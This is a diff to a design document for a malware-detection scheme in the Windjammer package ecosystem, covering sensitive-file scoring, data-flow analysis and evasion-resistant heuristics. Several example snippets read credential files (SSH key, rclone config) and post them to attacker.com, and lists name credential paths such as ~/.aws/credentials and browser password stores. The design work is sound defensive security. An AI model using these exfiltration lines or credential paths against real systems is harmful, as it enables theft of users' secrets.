@@ -629,46 +629,319 @@ Explanation: Parser is secretly sending user data to external server.
 
 **Key insight:** Windjammer analyzes ALL functions (public + private), not just exports.
 
-#### Red Flag 2: Credential Reading
+#### Red Flag 2: Sensitive Data Access
 
-**Pattern: Any access to credential files**
+**Challenge:** Hard-coded paths like `~/.ssh/*` are brittle. Different OSes, different apps, different conventions. Can't anticipate every sensitive location.
+
+**Solution: Multi-Signal Sensitive Data Detection**
+
+##### Signal 1: Content-Based Detection (Entropy & Format Analysis)
+
+**Analyze what the FILE CONTAINS, not where it's located:**
+
+```rust
+fn analyze_file_sensitivity(path: &Path, contents: &[u8]) -> SensitivityScore {
+    let mut score = 0.0;
+    
+    // High entropy = likely encrypted/keys
+    let entropy = calculate_shannon_entropy(contents);
+    if entropy > 7.5 {  // Near-random data
+        score += 3.0;
+    }
+    
+    // Check for cryptographic markers
+    if contains_pem_headers(contents) {  // "-----BEGIN RSA PRIVATE KEY-----"
+        score += 5.0;
+    }
+    if contains_ssh_key_format(contents) {
+        score += 5.0;
+    }
+    if contains_pgp_headers(contents) {
+        score += 5.0;
+    }
+    
+    // Check for structured secrets
+    if let Ok(json) = parse_json(contents) {
+        if json.has_field("private_key") || 
+           json.has_field("secret") ||
+           json.has_field("access_token") {
+            score += 4.0;
+        }
+    }
+    
+    // Small files are more likely to be credentials (not data files)
+    if contents.len() < 10_000 {  // <10KB
+        score += 1.0;
+    }
+    
+    SensitivityScore {
+        score,
+        confidence: calculate_confidence(&contents),
+        reasons: explain_score(&contents),
+    }
+}
+```
+
+##### Signal 2: Path-Based Heuristics (OS-Agnostic)
+
+**Patterns that indicate sensitivity, regardless of OS:**
+
+```rust
+fn analyze_path_sensitivity(path: &Path) -> SensitivityScore {
+    let mut score = 0.0;
+    let path_str = path.to_string_lossy();
+    
+    // Hidden directories (Unix: .foo, Windows: System attribute)
+    if is_hidden_directory(path) {
+        score += 2.0;
+    }
+    
+    // Common sensitive directory names (cross-platform)
+    let sensitive_dirs = ["ssh", "gnupg", "aws", "azure", "gcloud", 
+                          "docker", "kubernetes", "keys", "certificates",
+                          "vault", "password-store", "keyring"];
+    for dir in sensitive_dirs {
+        if path_str.contains(dir) {
+            score += 3.0;
+            break;
+        }
+    }
+    
+    // File extensions indicating credentials
+    let sensitive_exts = ["key", "pem", "p12", "pfx", "jks", "keystore",
+                          "kdbx", "asc", "gpg", "pgp"];
+    if let Some(ext) = path.extension() {
+        if sensitive_exts.contains(&ext.to_str().unwrap()) {
+            score += 3.0;
+        }
+    }
+    
+    // Special files per OS
+    match std::env::consts::OS {
+        "linux" | "macos" => {
+            if path_str.contains("/.gnupg/") || 
+               path_str.contains("/.password-store/") ||
+               path_str.contains("/etc/shadow") {
+                score += 5.0;
+            }
+        }
+        "windows" => {
+            if path_str.contains("\\AppData\\Local\\Microsoft\\Credentials") ||
+               path_str.contains("\\Users\\") && path_str.contains("\\NTUSER.DAT") {
+                score += 5.0;
+            }
+        }
+        _ => {}
+    }
+    
+    SensitivityScore { score, .. }
+}
+```
+
+##### Signal 3: OS-Provided Sensitivity Markers
+
+**Use operating system APIs when available:**
+
+```rust
+fn check_os_sensitivity_markers(path: &Path) -> bool {
+    match std::env::consts::OS {
+        "windows" => {
+            // Windows Protected Folders API
+            if is_protected_folder(path) {
+                return true;
+            }
+            // Windows Data Loss Prevention (DLP) labels
+            if has_dlp_label(path, "Confidential") {
+                return true;
+            }
+        }
+        "linux" => {
+            // SELinux security context
+            if get_selinux_context(path).contains("secret") {
+                return true;
+            }
+            // AppArmor labels
+            if has_apparmor_label(path, "confidential") {
+                return true;
+            }
+        }
+        "macos" => {
+            // macOS Keychain items
+            if is_keychain_item(path) {
+                return true;
+            }
+            // File quarantine attributes
+            if has_extended_attribute(path, "com.apple.quarantine") {
+                return true;
+            }
+        }
+        _ => {}
+    }
+    false
+}
+```
+
+##### Signal 4: Community-Maintained Sensitive Path Database
+
+**Crowdsourced knowledge, auto-updated:**
+
+```toml
+# ~/.wj/sensitive-paths-db.toml (auto-updated from registry)
+version = "2026.03.21"
+
+[patterns.ssh]
+paths = ["~/.ssh/id_*", "~/.ssh/*_key"]
+extensions = [".key", ".pem"]
+confidence = "high"
+os = ["linux", "macos", "windows"]
+
+[patterns.aws]
+paths = ["~/.aws/credentials", "~/.aws/config"]
+extensions = []
+confidence = "high"
+os = ["all"]
+
+[patterns.docker]
+paths = ["~/.docker/config.json"]
+confidence = "medium"
+reason = "Contains registry credentials"
+
+[patterns.browser-passwords]
+paths = [
+    "~/Library/Application Support/Google/Chrome/*/Login Data",  # macOS
+    "~/.config/google-chrome/*/Login Data",  # Linux
+    "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\*/Login Data"   # Windows
+]
+confidence = "critical"
+
+# ... 500+ more patterns (community-maintained)
+```
+
+**Auto-update mechanism:**
+```rust
+// On build, check for updates
+fn update_sensitive_paths_db() -> Result<(), Error> {
+    let current_version = read_local_db_version()?;
+    let latest_version = fetch_registry_db_version()?;
+    
+    if latest_version > current_version {
+        let new_db = download_db(latest_version)?;
+        verify_signature(&new_db)?;  // Signed by Windjammer team
+        install_db(&new_db)?;
+    }
+    
+    Ok(())
+}
+```
+
+##### Signal 5: Runtime Access Pattern Analysis (Future)
+
+**Learn from actual usage (optional telemetry):**
+
+```rust
+struct AccessPattern {
+    path: PathBuf,
+    access_count: u64,
+    first_seen: DateTime,
+    last_accessed: DateTime,
+    always_same_app: bool,  // Only accessed by one program (e.g., ssh-agent)
+}
+
+fn infer_sensitivity_from_patterns(path: &Path) -> SensitivityScore {
+    let pattern = get_access_pattern(path);
+    
+    let mut score = 0.0;
+    
+    // Rarely accessed = likely credential (not data file)
+    if pattern.access_count < 10 && pattern.age_days() > 30 {
+        score += 2.0;
+    }
+    
+    // Only one application accesses it = likely credential
+    if pattern.always_same_app {
+        score += 2.0;
+    }
+    
+    // Small file + rare access = likely credential
+    if pattern.file_size < 10_000 && pattern.access_count < 5 {
+        score += 3.0;
+    }
+    
+    SensitivityScore { score, .. }
+}
+```
+
+##### Combined Sensitivity Detection
+
+**Aggregate all signals:**
+
+```rust
+fn is_sensitive_file_access(path: &Path, contents: Option<&[u8]>) -> SensitivityAssessment {
+    let mut scores = Vec::new();
+    
+    // Signal 1: Content analysis (if available)
+    if let Some(data) = contents {
+        scores.push(analyze_file_sensitivity(path, data));
+    }
+    
+    // Signal 2: Path heuristics
+    scores.push(analyze_path_sensitivity(path));
+    
+    // Signal 3: OS markers
+    if check_os_sensitivity_markers(path) {
+        scores.push(SensitivityScore { score: 5.0, confidence: High, .. });
+    }
+    
+    // Signal 4: Known patterns database
+    scores.push(check_sensitive_paths_db(path));
+    
+    // Signal 5: Access patterns (optional)
+    if let Some(pattern) = get_access_pattern(path) {
+        scores.push(infer_sensitivity_from_patterns(path));
+    }
+    
+    // Aggregate scores (weighted average, max, etc.)
+    let total_score = scores.iter().map(|s| s.score).sum::<f64>();
+    let max_confidence = scores.iter().map(|s| s.confidence).max();
+    
+    SensitivityAssessment {
+        is_sensitive: total_score > 10.0,
+        confidence: max_confidence.unwrap_or(Low),
+        score: total_score,
+        signals: scores,
+    }
+}
+```
+
+**Example detection:**
 
 ```windjammer
-// Malicious package
-pub fn optimize_image(path: str) -> Image {
-    let img = load_image(path)
-    
-    // Steal SSH keys while we're at it
-    let ssh_key = fs.read_file("~/.ssh/id_rsa")
-    http.post("https://attacker.com/keys", ssh_key)
-    
-    optimize(img)
-}
+// Malicious code tries to read obscure credential file
+let data = fs.read_file("/Users/bob/.config/rclone/rclone.conf")
+http.post("https://attacker.com/exfiltrate", data)
 ```
 
 **Compiler analysis:**
 ```
-🚨 CREDENTIAL ACCESS DETECTED
+🚨 SENSITIVE FILE ACCESS DETECTED
 
-File access: ~/.ssh/id_rsa (SSH private key)
-Network access: attacker.com
+File: /Users/bob/.config/rclone/rclone.conf
+Sensitivity score: 12.5 / 20
 
-Data flow: Credential file → Network
+Detection signals:
+✓ High entropy content (7.8) - likely encrypted
+✓ Hidden directory (.config)
+✓ Small file size (2.3 KB)
+✓ JSON with "access_token" field
+✓ Known pattern: rclone configuration (contains cloud credentials)
 
-Severity: CRITICAL
-Explanation: Package reads SSH private keys and sends to network.
-This is ALWAYS malicious.
+Confidence: HIGH
+Data flow: Sensitive file → Network
 
-Verdict: BLOCKED (cannot override)
+Verdict: CRITICAL (credential exfiltration)
 ```
 
-**Hard block patterns (always malicious):**
-- `fs.read_file("~/.ssh/*")`
-- `fs.read_file("~/.aws/*")`  
-- `fs.read_file("~/.gnupg/*")`
-- `env.get("*PASSWORD*")` → network
-- `env.get("*SECRET*")` → network
-- `env.get("*TOKEN*")` → network
+**Key advantage:** Catches credentials even if path is unknown to us. Content analysis finds the secrets.
 
 #### Red Flag 3: Suspicious Data Flow
 
@@ -1249,6 +1522,456 @@ Statistical analysis:
 
 Conclusion: This package is a statistical outlier.
 ```
+
+---
+
+## Gaming Resistance: Adversarial Security Design
+
+### The Challenge
+
+**Windjammer is open-source.** Attackers will:
+1. Read the RFC (this document!)
+2. Study the heuristics
+3. Craft malware that bypasses detection
+4. Example: "Oh, they check cyclomatic complexity? I'll split my malicious code into tiny functions."
+
+**We must assume attackers have complete knowledge of our detection mechanisms.**
+
+### Defense Strategy: Multi-Dimensional, Adversarially Robust Heuristics
+
+#### Principle 1: No Single Point of Failure
+
+**Bad approach (gameable):**
+```rust
+// ❌ Easy to bypass
+if cyclomatic_complexity > 50 {
+    return Verdict::Suspicious;
+}
+// Attacker: "I'll just split functions to get complexity < 50"
+```
+
+**Good approach (hard to game):**
+```rust
+// ✅ Multiple independent signals
+let signals = vec![
+    check_cyclomatic_complexity(func),
+    check_data_flow_patterns(func),
+    check_call_graph_structure(func),
+    check_information_flow(func),
+    check_behavioral_clustering(func),
+    check_statistical_outliers(func),
+];
+
+// ALL must be within acceptable ranges
+let verdict = aggregate_signals(signals);
+```
+
+**Why this is hard to game:**
+- Attacker must optimize for ALL signals simultaneously
+- Multi-objective optimization is NP-hard
+- Satisfying one constraint often violates another
+
+#### Principle 2: Behavioral Properties That Are Fundamental
+
+**Properties that are hard to fake without breaking functionality:**
+
+##### 1. Data Flow is Unfakeable
+
+**Malicious code MUST move data from source to sink:**
+```
+UserInput → ... → Network  (exfiltration)
+CredentialFile → ... → Network  (theft)
+UserInput → ... → ShellCommand  (injection)
+```
+
+**Attacker cannot hide this without breaking their attack.**
+
+```rust
+fn detect_sensitive_flows(cfg: &ControlFlowGraph) -> Vec<SensitiveFlow> {
+    // Find ALL paths from sources to sinks
+    let sources = find_sources(cfg);  // User input, files, env vars
+    let sinks = find_sinks(cfg);  // Network, shell, filesystem
+    
+    let mut flows = Vec::new();
+    
+    for source in sources {
+        for sink in sinks {
+            for path in cfg.all_paths_between(source, sink) {
+                if is_sensitive_flow(source, sink) {
+                    flows.push(SensitiveFlow {
+                        source,
+                        sink,
+                        path,
+                        sanitizers: find_sanitizers_on_path(&path),
+                    });
+                }
+            }
+        }
+    }
+    
+    flows
+}
+```
+
+**Gaming attempt:**
+```windjammer
+// Attacker tries to obfuscate flow
+pub fn parse(text: str) -> Value {
+    let x = text;
+    let y = helper1(x);
+    let z = helper2(y);
+    let w = helper3(z);
+    send_data(w);  // Eventually calls http.post()
+    
+    tokenize(text)
+}
+```
+
+**Still detected:**
+```
+Data flow traced:
+  text (UserInput) → x → y → z → w → http.post() (Network)
+
+Path length: 5 hops
+Sanitizers on path: None
+
+Verdict: Suspicious (unsanitized user input to network)
+```
+
+##### 2. Information Flow is Fundamental
+
+**Measure actual information flow, not code structure:**
+
+```rust
+fn calculate_information_flow(func: &Function) -> InformationFlowMetrics {
+    // How much information flows from inputs to outputs?
+    let taint_analysis = perform_taint_analysis(func);
+    
+    InformationFlowMetrics {
+        input_to_output: taint_analysis.input_influences_output,
+        input_to_network: taint_analysis.input_influences_network,
+        file_to_network: taint_analysis.file_influences_network,
+        
+        // Key metric: Does input "leak" to unintended sinks?
+        information_leakage: calculate_leakage(&taint_analysis),
+    }
+}
+```
+
+**Example:**
+```windjammer
+// Legitimate parser
+pub fn parse(text: str) -> Value {
+    // All input → output (legitimate)
+    tokenize(text).build_ast()
+}
+// Information flow: 100% input → return value (expected)
+
+// Malicious parser
+pub fn parse(text: str) -> Value {
+    let result = tokenize(text).build_ast()
+    http.post("attacker.com", text)  // Leakage!
+    result
+}
+// Information flow: 100% input → return + 100% input → network (SUSPICIOUS)
+```
+
+**Attacker cannot reduce information flow to network without breaking their exfiltration.**
+
+##### 3. Statistical Properties Are Emergent
+
+**Attackers cannot control ecosystem-wide statistics:**
+
+```rust
+fn compare_to_ecosystem(fingerprint: &BehaviorFingerprint) -> AnomalyScore {
+    // Load ecosystem statistics (10,000+ packages)
+    let ecosystem = load_ecosystem_stats();
+    
+    // Calculate how unusual this package is
+    let mut anomaly = 0.0;
+    
+    // For each capability, compare frequency
+    for cap in &fingerprint.capabilities {
+        let frequency = ecosystem.packages_with_purpose(fingerprint.purpose)
+            .iter()
+            .filter(|p| p.uses_capability(cap))
+            .count() as f64 / ecosystem.total_packages as f64;
+        
+        // Rare capabilities are suspicious
+        if frequency < 0.01 {  // <1% use this
+            anomaly += 10.0;
+        } else if frequency < 0.05 {  // <5%
+            anomaly += 5.0;
+        }
+    }
+    
+    AnomalyScore { score: anomaly }
+}
+```
+
+**Why this is hard to game:**
+- Attacker would need to make their malware match the statistical distribution
+- But the distribution represents LEGITIMATE packages
+- Matching the distribution means behaving like legitimate packages (not malicious)
+- It's a catch-22: Be normal (not detected) OR be malicious (detected)
+
+##### 4. Graph Topology is Structural
+
+**Call graph and CFG structure reveal intent:**
+
+```rust
+fn analyze_graph_topology(package: &Package) -> GraphMetrics {
+    let call_graph = build_call_graph(package);
+    let cfg = build_control_flow_graph(package);
+    
+    GraphMetrics {
+        // Shape metrics (hard to fake)
+        avg_out_degree: call_graph.average_out_degree(),
+        clustering_coefficient: call_graph.clustering_coefficient(),
+        betweenness_centrality: call_graph.betweenness_centrality(),
+        
+        // Structural patterns
+        has_star_topology: call_graph.has_star_pattern(),  // One central function
+        has_long_chains: call_graph.has_long_chains(),  // Deep call stacks
+        has_cycles: cfg.has_cycles(),  // Loops
+        
+        // Suspicious patterns
+        io_at_leaves: are_io_calls_at_leaf_nodes(&call_graph),  // Hidden I/O
+        dead_code_ratio: calculate_dead_code_ratio(&cfg),  // Obfuscation
+    }
+}
+```
+
+**Example detection:**
+```
+Call graph analysis:
+
+Public API: parse()
+├─> tokenize()
+│   ├─> build_tokens()
+│   └─> validate_syntax()
+└─> helper_x()
+    └─> helper_y()
+        └─> helper_z()
+            └─> helper_q()
+                └─> helper_r()
+                    └─> http.post() 🚩
+
+Topology metrics:
+├─> Long chain to I/O: 6 hops
+├─> I/O at leaf node: true (hidden in deepest function)
+├─> Avg chain length for parsers: 2.3 hops
+└─> Anomaly: 260% longer than typical
+
+Verdict: Obfuscation pattern detected
+```
+
+**Attacker cannot flatten the call graph without exposing the malicious code.**
+
+#### Principle 3: Ensemble Methods with Different Failure Modes
+
+**Use multiple detection techniques that fail in DIFFERENT ways:**
+
+```rust
+struct EnsembleDetector {
+    detectors: Vec<Box<dyn Detector>>,
+}
+
+impl EnsembleDetector {
+    fn analyze(&self, package: &Package) -> Verdict {
+        let mut verdicts = Vec::new();
+        
+        // Static analysis
+        verdicts.push(self.static_analyzer.analyze(package));
+        
+        // Dynamic analysis (sandbox)
+        verdicts.push(self.sandbox_tester.analyze(package));
+        
+        // Statistical analysis
+        verdicts.push(self.anomaly_detector.analyze(package));
+        
+        // Machine learning classifier
+        verdicts.push(self.ml_classifier.predict(package));
+        
+        // Graph-based detection
+        verdicts.push(self.graph_analyzer.analyze(package));
+        
+        // Aggregate with voting
+        self.vote(verdicts)
+    }
+    
+    fn vote(&self, verdicts: Vec<Verdict>) -> Verdict {
+        // If ANY detector says CRITICAL, block
+        if verdicts.iter().any(|v| v == Verdict::Critical) {
+            return Verdict::Critical;
+        }
+        
+        // If MAJORITY say Suspicious, flag
+        let suspicious_count = verdicts.iter().filter(|v| v == Verdict::Suspicious).count();
+        if suspicious_count > verdicts.len() / 2 {
+            return Verdict::Suspicious;
+        }
+        
+        Verdict::Safe
+    }
+}
+```
+
+**Why this is robust:**
+- Static analysis can be evaded with obfuscation → but dynamic analysis catches it
+- Dynamic analysis can miss code paths → but static analysis is exhaustive
+- Statistical analysis can have false positives → but ML can learn from corrections
+- No single evasion technique works against all detectors
+
+#### Principle 4: Proprietary Server-Side Components
+
+**Not all heuristics need to be public:**
+
+```
+┌─────────────────────────────────────────┐
+│ OPEN SOURCE (Client-Side)              │
+├─────────────────────────────────────────┤
+│ - Basic capability inference            │
+│ - Data flow tracking                    │
+│ - Known patterns (sensitive paths, etc.)│
+│ - Red flag detection                    │
+│                                         │
+│ Result: 70% detection rate              │
+└─────────────────────────────────────────┘
+
+┌─────────────────────────────────────────┐
+│ PROPRIETARY (Registry Server-Side)      │
+├─────────────────────────────────────────┤
+│ - Advanced ML models (trained on 100k+) │
+│ - Behavioral clustering (proprietary)   │
+│ - Adversarial evasion detection         │
+│ - Zero-day pattern recognition          │
+│ - Attacker fingerprinting               │
+│                                         │
+│ Result: 99% detection rate              │
+└─────────────────────────────────────────┘
+```
+
+**Registry analysis includes proprietary models:**
+```rust
+// Public client-side
+let basic_assessment = open_source_analysis(package);
+
+// Query registry for advanced analysis (proprietary)
+let advanced_assessment = registry_api.analyze_package(package);
+
+// Combine assessments
+let final_verdict = combine(basic_assessment, advanced_assessment);
+```
+
+**Why this works:**
+- Attackers can study open-source heuristics
+- But registry uses additional proprietary detection
+- Attacker must bypass BOTH to succeed
+- Proprietary models updated frequently (adversarial ML)
+
+#### Principle 5: Adaptive Heuristics (Adversarial Machine Learning)
+
+**Continuously update detection models based on new attacks:**
+
+```rust
+struct AdaptiveDetector {
+    models: Vec<DetectionModel>,
+    attack_history: AttackDatabase,
+}
+
+impl AdaptiveDetector {
+    fn update_models(&mut self) {
+        // When new attack is discovered:
+        // 1. Add to attack database
+        // 2. Retrain models to detect this pattern
+        // 3. Deploy updated models to registry
+        
+        for attack in self.attack_history.recent_attacks() {
+            // Extract features from attack
+            let features = extract_features(&attack);
+            
+            // Retrain classifier
+            self.models.iter_mut().for_each(|model| {
+                model.retrain_with_negative_example(features.clone());
+            });
+        }
+        
+        // Adversarial testing: Generate evasion attempts
+        for model in &self.models {
+            let evasion_attempts = generate_evasion_attempts(model);
+            
+            // If evasion succeeds, strengthen model
+            for attempt in evasion_attempts {
+                if model.classify(&attempt) == Verdict::Safe {
+                    model.add_negative_example(attempt);
+                    model.retrain();
+                }
+            }
+        }
+    }
+}
+```
+
+**Update cycle:**
+```
+1. New attack discovered (e.g., event-stream)
+2. Analyze attack pattern
+3. Update detection models
+4. Deploy to registry (server-side)
+5. Next time attacker tries same pattern → detected
+6. Attacker must find NEW evasion → goto 1
+```
+
+**This is a cat-and-mouse game, but we have advantages:**
+- We can update faster than attackers can adapt
+- Each evasion attempt teaches us a new pattern
+- Adversarial ML makes models more robust over time
+
+#### Principle 6: Economic Cost of Evasion
+
+**Make bypassing detection EXPENSIVE:**
+
+**Cost to attacker:**
+1. Study all heuristics (time)
+2. Craft evasion (expert knowledge)
+3. Test against detection (trial and error)
+4. Maintain evasion as heuristics update (ongoing cost)
+5. Risk detection if evasion fails (reputation loss)
+
+**Cost to legitimate developer:**
+1. Write code normally (zero cost)
+2. If flagged, provide justification (one-time, <1 minute)
+
+**If evasion cost > attack value, attackers give up.**
+
+**Example:**
+```
+Attack value: Steal credentials from 1000 developers
+Evasion cost: 40 hours of expert reverse engineering
+Detection risk: 80% (multi-signal detection)
+Expected value: (1000 * $value * 0.2) - (40 * $hourly_rate)
+
+If expected value < 0, attack not worth it.
+```
+
+#### Principle 7: Transparency Where It Helps, Opacity Where It Hurts
+
+**Be transparent about:**
+- Overall approach (this RFC)
+- Basic heuristics (capability inference, data flow)
+- Red flags (sensitive file access, hidden I/O)
+
+**Keep opaque:**
+- Exact thresholds (what anomaly score triggers blocking?)
+- Proprietary ML model architectures
+- Server-side detection algorithms
+- Specific weights in ensemble voting
+
+**Why:**
+- Transparency builds trust (open-source community)
+- Opacity prevents precise gaming (adversarial security)
+- Attackers know WHAT we detect, but not exactly HOW
 
 ---
 
